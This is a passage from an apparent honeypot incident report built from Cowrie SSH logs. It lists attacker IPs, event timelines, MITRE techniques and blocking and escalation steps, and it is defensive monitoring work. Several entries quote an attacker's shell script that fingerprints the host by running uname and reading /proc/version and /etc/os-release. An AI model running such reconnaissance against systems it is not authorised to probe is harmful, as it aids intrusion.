| `2026-08-24 05:14:56` | `cowrie.login.success` |
| `2026-08-24 05:14:57` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.221.107[.]99` to AbuseIPDB if not already reported
- [ ] Block `62.221.107[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e17d6f98e621

| Field | Detail |
|---|---|
| **Source IP** | `71.236.99[.]31` |
| **First Seen** | 2026-08-24 05:15 |
| **Last Seen** | 2026-08-24 05:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:15:02` | `cowrie.session.connect` |
| `2026-08-24 05:15:02` | `cowrie.client.version` |
| `2026-08-24 05:15:02` | `cowrie.client.kex` |
| `2026-08-24 05:15:03` | `cowrie.login.success` |
| `2026-08-24 05:15:04` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.236.99[.]31` to AbuseIPDB if not already reported
- [ ] Block `71.236.99[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3be1813de9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 05:17 |
| **Last Seen** | 2026-08-24 05:17 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:17:25` | `cowrie.session.connect` |
| `2026-08-24 05:17:27` | `cowrie.client.version` |
| `2026-08-24 05:17:27` | `cowrie.client.kex` |
| `2026-08-24 05:17:32` | `cowrie.login.success` |
| `2026-08-24 05:17:36` | `cowrie.session.params` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.success` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:36` | `cowrie.command.input` |
| `2026-08-24 05:17:46` | `cowrie.log.closed` |
| `2026-08-24 05:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b0e9db901b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-08-24 05:18 |
| **Last Seen** | 2026-08-24 05:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:18:00` | `cowrie.session.connect` |
| `2026-08-24 05:18:00` | `cowrie.client.version` |
| `2026-08-24 05:18:00` | `cowrie.client.kex` |
| `2026-08-24 05:18:02` | `cowrie.login.success` |
| `2026-08-24 05:18:03` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4826f8caa744

| Field | Detail |
|---|---|
| **Source IP** | `63.42.190[.]239` |
| **First Seen** | 2026-08-24 05:18 |
| **Last Seen** | 2026-08-24 05:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:18:08` | `cowrie.session.connect` |
| `2026-08-24 05:18:11` | `cowrie.client.version` |
| `2026-08-24 05:18:12` | `cowrie.client.kex` |
| `2026-08-24 05:18:14` | `cowrie.login.success` |
| `2026-08-24 05:18:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.42.190[.]239` to AbuseIPDB if not already reported
- [ ] Block `63.42.190[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899da53d0d2b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:19 |
| **Last Seen** | 2026-08-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:19:16` | `cowrie.session.connect` |
| `2026-08-24 05:19:16` | `cowrie.client.version` |
| `2026-08-24 05:19:16` | `cowrie.client.kex` |
| `2026-08-24 05:19:17` | `cowrie.login.success` |
| `2026-08-24 05:19:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:19:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:19:17` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-635198ba459f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:19 |
| **Last Seen** | 2026-08-24 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:19:20` | `cowrie.session.connect` |
| `2026-08-24 05:19:20` | `cowrie.client.version` |
| `2026-08-24 05:19:20` | `cowrie.client.kex` |
| `2026-08-24 05:19:21` | `cowrie.login.success` |
| `2026-08-24 05:19:21` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:19:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:19:21` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1a6ff1ade4

| Field | Detail |
|---|---|
| **Source IP** | `35.241.157[.]87` |
| **First Seen** | 2026-08-24 05:20 |
| **Last Seen** | 2026-08-24 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:20:39` | `cowrie.session.connect` |
| `2026-08-24 05:20:39` | `cowrie.login.success` |
| `2026-08-24 05:20:39` | `cowrie.session.params` |
| `2026-08-24 05:20:39` | `cowrie.command.input` |
| `2026-08-24 05:20:39` | `cowrie.command.input` |
| `2026-08-24 05:20:39` | `cowrie.command.failed` |
| `2026-08-24 05:20:39` | `cowrie.command.input` |
| `2026-08-24 05:20:39` | `cowrie.log.closed` |
| `2026-08-24 05:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.157[.]87` to AbuseIPDB if not already reported
- [ ] Block `35.241.157[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac9bd4561bd1

| Field | Detail |
|---|---|
| **Source IP** | `35.241.157[.]87` |
| **First Seen** | 2026-08-24 05:20 |
| **Last Seen** | 2026-08-24 05:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:20:52` | `cowrie.session.connect` |
| `2026-08-24 05:20:52` | `cowrie.login.success` |
| `2026-08-24 05:20:53` | `cowrie.session.params` |
| `2026-08-24 05:20:53` | `cowrie.command.input` |
| `2026-08-24 05:20:53` | `cowrie.command.failed` |
| `2026-08-24 05:20:59` | `cowrie.log.closed` |
| `2026-08-24 05:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.157[.]87` to AbuseIPDB if not already reported
- [ ] Block `35.241.157[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35150774671d

| Field | Detail |
|---|---|
| **Source IP** | `35.241.157[.]87` |
| **First Seen** | 2026-08-24 05:20 |
| **Last Seen** | 2026-08-24 05:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:20:54` | `cowrie.session.connect` |
| `2026-08-24 05:20:54` | `cowrie.login.success` |
| `2026-08-24 05:20:55` | `cowrie.session.params` |
| `2026-08-24 05:20:55` | `cowrie.command.input` |
| `2026-08-24 05:20:59` | `cowrie.log.closed` |
| `2026-08-24 05:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.157[.]87` to AbuseIPDB if not already reported
- [ ] Block `35.241.157[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d1f9519484

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 05:21 |
| **Last Seen** | 2026-08-24 05:21 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:21:03` | `cowrie.session.connect` |
| `2026-08-24 05:21:04` | `cowrie.client.version` |
| `2026-08-24 05:21:04` | `cowrie.client.kex` |
| `2026-08-24 05:21:09` | `cowrie.login.success` |
| `2026-08-24 05:21:15` | `cowrie.session.params` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.success` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:15` | `cowrie.command.input` |
| `2026-08-24 05:21:16` | `cowrie.log.closed` |
| `2026-08-24 05:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f87ef0764f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.143[.]19` |
| **First Seen** | 2026-08-24 05:22 |
| **Last Seen** | 2026-08-24 05:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:22:54` | `cowrie.session.connect` |
| `2026-08-24 05:22:54` | `cowrie.client.version` |
| `2026-08-24 05:22:54` | `cowrie.client.kex` |
| `2026-08-24 05:22:56` | `cowrie.login.success` |
| `2026-08-24 05:22:56` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.143[.]19` to AbuseIPDB if not already reported
- [ ] Block `65.20.143[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96c5e23ff22e

| Field | Detail |
|---|---|
| **Source IP** | `169.211.207[.]4` |
| **First Seen** | 2026-08-24 05:23 |
| **Last Seen** | 2026-08-24 05:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:23:01` | `cowrie.session.connect` |
| `2026-08-24 05:23:02` | `cowrie.client.version` |
| `2026-08-24 05:23:02` | `cowrie.client.kex` |
| `2026-08-24 05:23:04` | `cowrie.login.success` |
| `2026-08-24 05:23:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.207[.]4` to AbuseIPDB if not already reported
- [ ] Block `169.211.207[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470d96397077

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 05:24 |
| **Last Seen** | 2026-08-24 05:24 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:24:08` | `cowrie.session.connect` |
| `2026-08-24 05:24:10` | `cowrie.client.version` |
| `2026-08-24 05:24:10` | `cowrie.client.kex` |
| `2026-08-24 05:24:16` | `cowrie.login.success` |
| `2026-08-24 05:24:19` | `cowrie.session.params` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.success` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:19` | `cowrie.command.input` |
| `2026-08-24 05:24:22` | `cowrie.log.closed` |
| `2026-08-24 05:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3cd6c38971

| Field | Detail |
|---|---|
| **Source IP** | `8.216.8[.]182` |
| **First Seen** | 2026-08-24 05:25 |
| **Last Seen** | 2026-08-24 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:25:23` | `cowrie.session.connect` |
| `2026-08-24 05:25:23` | `cowrie.login.success` |
| `2026-08-24 05:25:24` | `cowrie.session.params` |
| `2026-08-24 05:25:24` | `cowrie.command.input` |
| `2026-08-24 05:25:24` | `cowrie.command.failed` |
| `2026-08-24 05:25:24` | `cowrie.command.input` |
| `2026-08-24 05:25:24` | `cowrie.command.failed` |
| `2026-08-24 05:25:24` | `cowrie.command.input` |
| `2026-08-24 05:25:26` | `cowrie.log.closed` |
| `2026-08-24 05:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.216.8[.]182` to AbuseIPDB if not already reported
- [ ] Block `8.216.8[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd0b54c0bc7

| Field | Detail |
|---|---|
| **Source IP** | `61.143.227[.]17` |
| **First Seen** | 2026-08-24 05:27 |
| **Last Seen** | 2026-08-24 05:27 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:27:09` | `cowrie.session.connect` |
| `2026-08-24 05:27:10` | `cowrie.client.version` |
| `2026-08-24 05:27:10` | `cowrie.client.kex` |
| `2026-08-24 05:27:14` | `cowrie.login.success` |
| `2026-08-24 05:27:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.143.227[.]17` to AbuseIPDB if not already reported
- [ ] Block `61.143.227[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b204a101b95

| Field | Detail |
|---|---|
| **Source IP** | `24.89.134[.]244` |
| **First Seen** | 2026-08-24 05:27 |
| **Last Seen** | 2026-08-24 05:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:27:21` | `cowrie.session.connect` |
| `2026-08-24 05:27:22` | `cowrie.client.version` |
| `2026-08-24 05:27:22` | `cowrie.client.kex` |
| `2026-08-24 05:27:23` | `cowrie.login.success` |
| `2026-08-24 05:27:23` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.89.134[.]244` to AbuseIPDB if not already reported
- [ ] Block `24.89.134[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e538111d43d

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-08-24 05:27 |
| **Last Seen** | 2026-08-24 05:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:27:26` | `cowrie.session.connect` |
| `2026-08-24 05:27:27` | `cowrie.client.version` |
| `2026-08-24 05:27:27` | `cowrie.client.kex` |
| `2026-08-24 05:27:29` | `cowrie.login.success` |
| `2026-08-24 05:27:29` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eabe840c771

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-08-24 05:27 |
| **Last Seen** | 2026-08-24 05:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:27:34` | `cowrie.session.connect` |
| `2026-08-24 05:27:35` | `cowrie.client.version` |
| `2026-08-24 05:27:35` | `cowrie.client.kex` |
| `2026-08-24 05:27:38` | `cowrie.login.success` |
| `2026-08-24 05:27:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f063660fdfc7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:28 |
| **Last Seen** | 2026-08-24 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:28:43` | `cowrie.session.connect` |
| `2026-08-24 05:28:43` | `cowrie.client.version` |
| `2026-08-24 05:28:43` | `cowrie.client.kex` |
| `2026-08-24 05:28:44` | `cowrie.login.success` |
| `2026-08-24 05:28:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:28:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:28:44` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca7ebefc27c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 05:28 |
| **Last Seen** | 2026-08-24 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:28:47` | `cowrie.session.connect` |
| `2026-08-24 05:28:47` | `cowrie.client.version` |
| `2026-08-24 05:28:47` | `cowrie.client.kex` |
| `2026-08-24 05:28:48` | `cowrie.login.success` |
| `2026-08-24 05:28:48` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:28:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 05:28:48` | `cowrie.direct-tcpip.data` |
| `2026-08-24 05:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ffa6c070b1

| Field | Detail |
|---|---|
| **Source IP** | `85.99.93[.]200` |
| **First Seen** | 2026-08-24 05:31 |
| **Last Seen** | 2026-08-24 05:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 05:31:57` | `cowrie.session.connect` |
| `2026-08-24 05:31:58` | `cowrie.client.version` |
| `2026-08-24 05:31:58` | `cowrie.client.kex` |
| `2026-08-24 05:31:59` | `cowrie.login.success` |
| `2026-08-24 05:31:59` | `cowrie.direct-tcpip.request` |
| `2026-08-24 05:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.99.93[.]200` to AbuseIPDB if not already reported
- [ ] Block `85.99.93[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f281a22e11

| Field | Detail |
|---|---|
| **Source IP** | `37.255.213[.]72` |
| **First Seen** | 2026-08-24 05:32 |
| **Last Seen** | 2026-08-24 05:32 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
